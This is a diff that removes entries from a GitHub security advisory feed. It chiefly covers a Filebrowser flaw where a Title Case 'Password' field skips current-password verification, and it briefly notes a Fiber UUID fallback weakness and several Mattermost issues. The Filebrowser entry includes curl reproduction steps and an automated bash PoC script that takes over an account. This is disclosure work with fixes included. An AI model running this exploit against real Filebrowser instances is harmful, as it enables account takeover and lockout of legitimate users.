-    var sensibleFields = map[string]struct{}{
-        "all":          {},
-        "username":     {},
-        "password":     {},  // lowercase
-        "scope":        {},
-        "lockPassword": {},
-        "commands":     {},
-        "perm":         {},
-    }
-
-    for _, field := range req.Which {
-        if _, ok := sensibleFields[field]; ok {  // Case-sensitive lookup
-            if !users.CheckPwd(req.CurrentPassword, d.user.Password) {
-                return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect
-            }
-            break
-        }
-    }
-}
-</code></pre>
-<h3 id="root-cause">Root Cause</h3>
-<ol>
-<li>The <code>sensibleFields</code> map uses <strong>lowercase</strong> keys (e.g., <code>"password"</code>)</li>
-<li>The lookup <code>sensibleFields[field]</code> is <strong>case-sensitive</strong></li>
-<li>When <code>req.Which</code> contains <code>"Password"</code> (Title Case), the lookup returns <code>false</code></li>
-<li>The password verification block is skipped entirely</li>
-<li>Later in the code (line 229), field names are converted to Title Case for processing, so <code>"Password"</code> is a valid field name</li>
-</ol>
-<h3 id="attack-flow">Attack Flow</h3>
-<pre><code>1. Attacker obtains victim's JWT token (via XSS, log leakage, etc.)
-2. Attacker sends PUT /api/users/{id} with:
-   - which: ["Password"]  (Title Case - bypasses validation)
-   - data.password: "attacker_password"
-   - NO current_password field required
-3. Password is changed without verification
-4. Victim is locked out, attacker has full access
-</code></pre>
-<hr>
-<h2 id="poc">PoC</h2>
-<h3 id="prerequisites">Prerequisites</h3>
-<ul>
-<li>A valid JWT token for any user account</li>
-<li>Target Filebrowser instance using JSON authentication (default)</li>
-</ul>
-<h3 id="reproduction-steps">Reproduction Steps</h3>
-<p><strong>Step 1: Obtain a valid JWT token</strong></p>
-<pre><code class="language-bash">TOKEN=$(curl -s -X POST "http://target:8080/api/login" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"victim","password":"victim_password"}')
-</code></pre>
-<p><strong>Step 2: Attempt normal password change (should fail)</strong></p>
-<pre><code class="language-bash">curl -s -X PUT "http://target:8080/api/users/1" \
-  -H "X-Auth: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "what": "user",
-    "which": ["password"],
-    "data": {"id": 1, "password": "NewPassword123456"}
-  }'
-# Response: 400 Bad Request (the current password is incorrect)
-</code></pre>
-<p><strong>Step 3: Bypass with Title Case (succeeds without current_password)</strong></p>
-<pre><code class="language-bash">curl -s -X PUT "http://target:8080/api/users/1" \
-  -H "X-Auth: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "what": "user",
-    "which": ["Password"],
-    "data": {"id": 1, "password": "HackedPassword123"}
-  }'
-# Response: 200 OK
-</code></pre>
-<p><strong>Step 4: Verify account takeover</strong></p>
-<pre><code class="language-bash"># Original password no longer works
-curl -s -X POST "http://target:8080/api/login" \
-  -d '{"username":"victim","password":"victim_password"}'
-# Response: 403 Forbidden
-
-# New password works
-curl -s -X POST "http://target:8080/api/login" \
-  -d '{"username":"victim","password":"HackedPassword123"}'
-# Response: Valid JWT token
-</code></pre>
-<h3 id="automated-poc-script">Automated PoC Script</h3>
-<pre><code class="language-bash">#!/bin/bash
-# Usage: ./poc.sh &lt;target&gt; &lt;username&gt; &lt;current_password&gt; &lt;new_password&gt;
-
-TARGET="$1"
-USERNAME="$2"
-CURRENT_PASS="$3"
-NEW_PASS="$4"
-
-# Login
-TOKEN=$(curl -s -X POST "$TARGET/api/login" \
-  -H "Content-Type: application/json" \
-  -d "{\"username\":\"$USERNAME\",\"password\":\"$CURRENT_PASS\"}")
-
-# Get user ID from token
-USER_ID=$(echo "$TOKEN" | python3 -c "
-import sys,json,base64
-parts=input().split('.')
-payload=json.loads(base64.b64decode(parts[1]+'=='))
-print(payload['user']['id'])
-")
-
-# Exploit: Change password without current_password
-curl -s -X PUT "$TARGET/api/users/$USER_ID" \
-  -H "X-Auth: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d "{
-    \"what\": \"user\",
-    \"which\": [\"Password\"],
-    \"data\": {\"id\": $USER_ID, \"password\": \"$NEW_PASS\"}
-  }"
-
-echo "Password changed to: $NEW_PASS"
-</code></pre>
-<hr>
-<h2 id="impact">Impact</h2>
-<h3 id="who-is-impacted">Who is Impacted</h3>
-<ul>
-<li><strong>All Filebrowser users</strong> using JSON authentication method (default configuration)</li>
-<li>Any user whose JWT token can be obtained by an attacker</li>
-<li>Particularly high-value targets: administrator accounts</li>
-</ul>
-<h3 id="attack-scenarios">Attack Scenarios</h3>
-<table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Impact</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>XSS + Token Theft</td>
-<td>Complete account takeover</td>
-</tr>
-<tr>
-<td>JWT in Server Logs</td>
-<td>Mass account compromise</td>
-</tr>
-<tr>
-<td>Shared Computer</td>
-<td>Session hijacking</td>
-</tr>
-<tr>
-<td>Malicious Browser Extension</td>
-<td>Credential theft</td>
-</tr>
-</tbody></table>
-<h3 id="security-impact">Security Impact</h3>
-<table>
-<thead>
-<tr>
-<th>Category</th>
-<th>Severity</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Confidentiality</td>
-<td><strong>High</strong> - Attacker gains full account access</td>
-</tr>
-<tr>
-<td>Integrity</td>
-<td><strong>High</strong> - Attacker can modify all user data</td>
-</tr>
-<tr>
-<td>Availability</td>
-<td><strong>High</strong> - Legitimate user locked out</td>
-</tr>
-</tbody></table>
-<h3 id="scope">Scope</h3>
-<ul>
-<li>The vulnerability affects <strong>password modification only</strong></li>
-<li>Other sensitive fields (<code>Username</code>, <code>Scope</code>, <code>Perm</code>, etc.) have additional protection via <code>NonModifiableFieldsForNonAdmin</code> check</li>
-<li>However, for <strong>administrators</strong>, all fields can be modified using this bypass technique</li>
-</ul>
-<hr>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<h3 id="option-1-case-insensitive-field-matching-recommended">Option 1: Case-insensitive field matching (Recommended)</h3>
-<pre><code class="language-go">// Convert field to lowercase before checking
-for _, field := range req.Which {
-    if _, ok := sensibleFields[strings.ToLower(field)]; ok {
-        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {
-            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect
-        }
-        break
-    }
-}
-</code></pre>
-<h3 id="option-2-use-title-case-in-sensiblefields">Option 2: Use Title Case in sensibleFields</h3>
-<pre><code class="language-go">var sensibleFields = map[string]struct{}{
-    "All":          {},
-    "Username":     {},
-    "Password":     {},  // Title Case to match post-transformation
-    "Scope":        {},
-    "LockPassword": {},
-    "Commands":     {},
-    "Perm":         {},
-}
-
-// Check AFTER field name transformation
-for k, v := range req.Which {
-    v = cases.Title(language.English, cases.NoLower).String(v)
-    req.Which[k] = v
-    
-    // Now check with Title Case
-    if _, ok := sensibleFields[v]; ok {
-        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {
-            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect
-        }
-        break
-    }
-}
-</code></pre>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li>Affected File: <code>http/users.go</code></li>
-<li>Affected Lines: 181-200</li>
-<li>Related Code: <code>NonModifiableFieldsForNonAdmin</code> (line 17)</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hxw8-4h9j-hq2r">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hxw8-4h9j-hq2r</a></li>
-<li><a href="https://github.com/filebrowser/filebrowser/commit/ff2f00498cff151e2fb1f5f0b16963bf33c3d6d4">https://github.com/filebrowser/filebrowser/commit/ff2f00498cff151e2fb1f5f0b16963bf33c3d6d4</a></li>
-<li><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.57.1">https://github.com/filebrowser/filebrowser/releases/tag/v2.57.1</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25889">https://nvd.nist.gov/vuln/detail/CVE-2026-25889</a></li>
-<li><a href="https://github.com/advisories/GHSA-hxw8-4h9j-hq2r">https://github.com/advisories/GHSA-hxw8-4h9j-hq2r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hxw8-4h9j-hq2r</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-10T00:22:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gofiber/fiber/v2] Fiber has an insecure fallback in utils.UUIDv4() / utils.UUID() — predictable / zero‑UUID on crypto/rand failure]]></title>
-        <id>https://github.com/advisories/GHSA-68rr-p4fp-j59v</id>
-        <link href="https://github.com/advisories/GHSA-68rr-p4fp-j59v"/>
-        <updated>2026-02-09T18:49:19.000Z</updated>
-        <content type="html"><![CDATA[<p>Fiber v2 contains an internal vendored copy of <code>gofiber/utils</code>, and its functions <code>UUIDv4()</code> and <code>UUID()</code> inherit the same critical weakness described in the upstream advisory. On <strong>Go versions prior to 1.24</strong>, the underlying <code>crypto/rand</code> implementation <strong>can return an error</strong> if secure randomness cannot be obtained. In such cases, these Fiber v2 UUID functions silently fall back to generating predictable values — the all-zero UUID <code>00000000-0000-0000-0000-000000000000</code>.</p>
-<p>On Go <strong>1.24+</strong>, the language guarantees that <code>crypto/rand</code> no longer returns an error (it will block or panic instead), so this vulnerability primarily affects <strong>Fiber v2 users running Go 1.23 or earlier</strong>, which Fiber v2 officially supports.</p>
-<p>Because no error is returned by the Fiber v2 UUID functions, application code may unknowingly rely on <em>predictable, repeated, or low-entropy identifiers</em> in security-critical pathways. This is especially impactful because many Fiber v2 middleware components (session middleware, CSRF, rate limiting, request-ID generation, etc.) <strong>default to using <code>utils.UUIDv4()</code></strong>.</p>
-<p>Impact includes, but is not limited to:</p>
-<ul>
-<li><strong>Session fixation or hijacking</strong> (predictable session IDs)</li>
-<li><strong>CSRF token forgery</strong> or bypass</li>
-<li><strong>Authentication replay / token prediction</strong></li>
-<li><strong>Potential denial-of-service (DoS):</strong> if the zero UUID is generated, key-based structures (sessions, rate-limits, caches, CSRF stores) may collapse into a single shared key, causing overwrites, lock contention, or state corruption</li>
-<li><strong>Request-ID collisions</strong>, undermining logging and trace integrity</li>
-<li><strong>General compromise</strong> of confidentiality, integrity, and authorization logic relying on UUIDs for uniqueness or secrecy</li>
-</ul>
-<p>All Fiber v2 versions containing the internal <code>utils.UUIDv4()</code> / <code>utils.UUID()</code> implementation are affected when running on <strong>Go &lt;1.24</strong>. <strong>No patched Fiber v2 release currently exists.</strong></p>
-<hr>
-<h2 id="suggested-mitigations--workarounds">Suggested Mitigations / Workarounds</h2>
-<p>Update to the latest version of Fiber v2.</p>
-<hr>
-<h3 id="likelihood--environmental-factors">Likelihood / Environmental Factors</h3>
-<p>It’s important to note that <strong>entropy exhaustion on modern Linux systems is extremely rare</strong>, as the kernel’s CSPRNG is resilient and non-blocking. However, <strong>entropy-source failures</strong> — where <code>crypto/rand</code> cannot read from its underlying provider — are significantly more likely in certain environments.</p>
-<p>This includes containerized deployments, restricted sandboxes, misconfigured systems lacking read access to <code>/dev/urandom</code> or platform-equivalent sources, chrooted or jailed environments, embedded devices, or systems with non-standard or degraded randomness providers. On <strong>Go &lt;1.24</strong>, such failures cause <code>crypto/rand</code> to return an error, which the Fiber v2 UUID functions currently treat as a signal to silently generate predictable UUIDs, including the zero UUID. This silent fallback is the root cause of the vulnerability.</p>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><p>Upstream advisory for <code>gofiber/utils</code>: <strong>GHSA-m98w-cqp3-qcqr</strong></p>
-</li>
-<li><p>Source repositories:</p>
-<ul>
-<li><code>github.com/gofiber/fiber</code></li>
-<li><code>github.com/gofiber/utils</code></li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="credits--reporter">Credits / Reporter</h2>
-<p>Reported by <strong>@sixcolors</strong> (Fiber Maintainer / Security Team)</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-68rr-p4fp-j59v">https://github.com/gofiber/fiber/security/advisories/GHSA-68rr-p4fp-j59v</a></li>
-<li><a href="https://github.com/gofiber/fiber/commit/eb874b6f6c5896b968d9b0ab2b56ac7052cb0ee1">https://github.com/gofiber/fiber/commit/eb874b6f6c5896b968d9b0ab2b56ac7052cb0ee1</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-66630">https://nvd.nist.gov/vuln/detail/CVE-2025-66630</a></li>
-<li><a href="https://github.com/gofiber/fiber/releases/tag/v2.52.11">https://github.com/gofiber/fiber/releases/tag/v2.52.11</a></li>
-<li><a href="https://github.com/advisories/GHSA-68rr-p4fp-j59v">https://github.com/advisories/GHSA-68rr-p4fp-j59v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-68rr-p4fp-j59v</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-02-09T15:28:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Server does not restrict SAML certificate path for System Administrators]]></title>
-        <id>https://github.com/advisories/GHSA-5ghq-28r7-qwfj</id>
-        <link href="https://github.com/advisories/GHSA-5ghq-28r7-qwfj"/>
-        <updated>2026-02-06T22:59:04.000Z</updated>
-        <content type="html"><![CDATA[<p>An issue was discovered in Mattermost Server before 3.7.3 and 3.6.5. A System Administrator can place a SAML certificate at an arbitrary pathname.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-18918">https://nvd.nist.gov/vuln/detail/CVE-2017-18918</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/8ec37570742b67fd640bb3434ea226c655dbf408">https://github.com/mattermost/mattermost/commit/8ec37570742b67fd640bb3434ea226c655dbf408</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/a12e7fdca439948ab097431d68e8f59778fbab81">https://github.com/mattermost/mattermost/commit/a12e7fdca439948ab097431d68e8f59778fbab81</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-5ghq-28r7-qwfj">https://github.com/advisories/GHSA-5ghq-28r7-qwfj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5ghq-28r7-qwfj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2022-05-24T17:21:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Server does not restrict SAML certificate path for System Administrators]]></title>
-        <id>https://github.com/advisories/GHSA-5ghq-28r7-qwfj</id>
-        <link href="https://github.com/advisories/GHSA-5ghq-28r7-qwfj"/>
-        <updated>2026-02-06T22:59:04.000Z</updated>
-        <content type="html"><![CDATA[<p>An issue was discovered in Mattermost Server before 3.7.3 and 3.6.5. A System Administrator can place a SAML certificate at an arbitrary pathname.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-18918">https://nvd.nist.gov/vuln/detail/CVE-2017-18918</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/8ec37570742b67fd640bb3434ea226c655dbf408">https://github.com/mattermost/mattermost/commit/8ec37570742b67fd640bb3434ea226c655dbf408</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/a12e7fdca439948ab097431d68e8f59778fbab81">https://github.com/mattermost/mattermost/commit/a12e7fdca439948ab097431d68e8f59778fbab81</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-5ghq-28r7-qwfj">https://github.com/advisories/GHSA-5ghq-28r7-qwfj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5ghq-28r7-qwfj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2022-05-24T17:21:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Server uses weak hashing for OAuth, email verification tokens and invitations]]></title>
-        <id>https://github.com/advisories/GHSA-jxc4-w54c-qv5r</id>
-        <link href="https://github.com/advisories/GHSA-jxc4-w54c-qv5r"/>
-        <updated>2026-02-06T22:58:59.000Z</updated>
-        <content type="html"><![CDATA[<p>An issue was discovered in Mattermost Server before 3.8.2 and 3.7.5. Weak hashing was used for e-mail invitations, OAuth, and e-mail verification tokens.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-18917">https://nvd.nist.gov/vuln/detail/CVE-2017-18917</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/247cd1e51a8c943628dc650e87e794b06aad4c2b">https://github.com/mattermost/mattermost/commit/247cd1e51a8c943628dc650e87e794b06aad4c2b</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/b74e85653660525d351d090a1e1874ae933bcbc8">https://github.com/mattermost/mattermost/commit/b74e85653660525d351d090a1e1874ae933bcbc8</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-jxc4-w54c-qv5r">https://github.com/advisories/GHSA-jxc4-w54c-qv5r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jxc4-w54c-qv5r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2022-05-24T17:21:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Server uses weak hashing for OAuth, email verification tokens and invitations]]></title>
-        <id>https://github.com/advisories/GHSA-jxc4-w54c-qv5r</id>
-        <link href="https://github.com/advisories/GHSA-jxc4-w54c-qv5r"/>
-        <updated>2026-02-06T22:58:59.000Z</updated>
-        <content type="html"><![CDATA[<p>An issue was discovered in Mattermost Server before 3.8.2 and 3.7.5. Weak hashing was used for e-mail invitations, OAuth, and e-mail verification tokens.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-18917">https://nvd.nist.gov/vuln/detail/CVE-2017-18917</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/247cd1e51a8c943628dc650e87e794b06aad4c2b">https://github.com/mattermost/mattermost/commit/247cd1e51a8c943628dc650e87e794b06aad4c2b</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/b74e85653660525d351d090a1e1874ae933bcbc8">https://github.com/mattermost/mattermost/commit/b74e85653660525d351d090a1e1874ae933bcbc8</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-jxc4-w54c-qv5r">https://github.com/advisories/GHSA-jxc4-w54c-qv5r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jxc4-w54c-qv5r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2022-05-24T17:21:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Server has Improper Authorization for Integration Requests]]></title>
-        <id>https://github.com/advisories/GHSA-x33g-375j-jhf7</id>
-        <link href="https://github.com/advisories/GHSA-x33g-375j-jhf7"/>
-        <updated>2026-02-06T22:58:45.000Z</updated>
-        <content type="html"><![CDATA[<p>An issue was discovered in Mattermost Server before 3.8.2, 3.7.5, and 3.6.7. API endpoint access control does not honor an integration permission restriction.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-18916">https://nvd.nist.gov/vuln/detail/CVE-2017-18916</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/0968e4079e0aa670254f3fe3a7248d126e3cf877">https://github.com/mattermost/mattermost/commit/0968e4079e0aa670254f3fe3a7248d126e3cf877</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/b74e85653660525d351d090a1e1874ae933bcbc8">https://github.com/mattermost/mattermost/commit/b74e85653660525d351d090a1e1874ae933bcbc8</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/fb325cc339eb8d8efb60dbadc48fd38897201c6f">https://github.com/mattermost/mattermost/commit/fb325cc339eb8d8efb60dbadc48fd38897201c6f</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-x33g-375j-jhf7">https://github.com/advisories/GHSA-x33g-375j-jhf7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x33g-375j-jhf7</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2022-05-24T17:21:07.000Z</published>
     </entry>
 </feed>
